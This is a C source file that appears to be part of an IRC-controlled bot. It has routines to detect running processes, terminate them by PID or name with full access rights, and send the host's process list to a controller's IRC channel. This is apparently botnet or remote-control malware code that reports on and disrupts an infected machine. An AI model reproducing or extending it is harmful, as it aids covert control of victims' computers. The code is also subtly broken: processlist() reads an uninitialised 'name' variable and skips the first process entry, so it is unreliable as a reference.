#include "include.h"
#include "externs.h"
#include "hell.h"

bool isprocess(const char *name)
/* determine if a process is running or not */
{
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	if((hProcess = CreateToolhelp32Snapshot(2, 0)) != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if(Process32First(hProcess, &pe32))
		{
			while(Process32Next(hProcess, &pe32))
			{
				if(!stricmp(pe32.szExeFile, name))
				{
					CloseHandle(hProcess);
					return true;
				}
			} 
		}
		CloseHandle(hProcess);
	}
	return false;
}

bool processkill(int pid)
/* kill process by pid */
{
	HANDLE pHandle;
	if((pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)))
	{
		if(!TerminateProcess(pHandle, 0))
		{
			CloseHandle(pHandle);
			return false;
		}
		return true;
	}
	return false;
}

void processlist()
/* get a list of processes and kill some if necessary */
{
	const char *name;
	HANDLE hProcess;
	HANDLE hProcess2;
	PROCESSENTRY32 pe32;
	if((hProcess = CreateToolhelp32Snapshot(2, 0)) != INVALID_HANDLE_VALUE)
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if(Process32First(hProcess, &pe32))
		{
			while(Process32Next(hProcess, &pe32))
			{
				if(name[0]) /* kill the process */
				{
					if(!stricmp(pe32.szExeFile, name))
					{
						hProcess2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
						TerminateProcess(hProcess2, 0);
						CloseHandle(hProcess2);
					}
				}
				else /* just send the process list */
				{
					hProcess2 = CreateToolhelp32Snapshot(2, pe32.th32ProcessID);
					BOT->cIRC.SendData("PRIVMSG %s :-process- %s %d \r\n",BOT->cIRC.cConf.cChan.c_str(), pe32.szExeFile, pe32.th32ProcessID);
					CloseHandle(hProcess2);
					Sleep(1000);
				}
			} 
		}
		CloseHandle(hProcess);
	}
}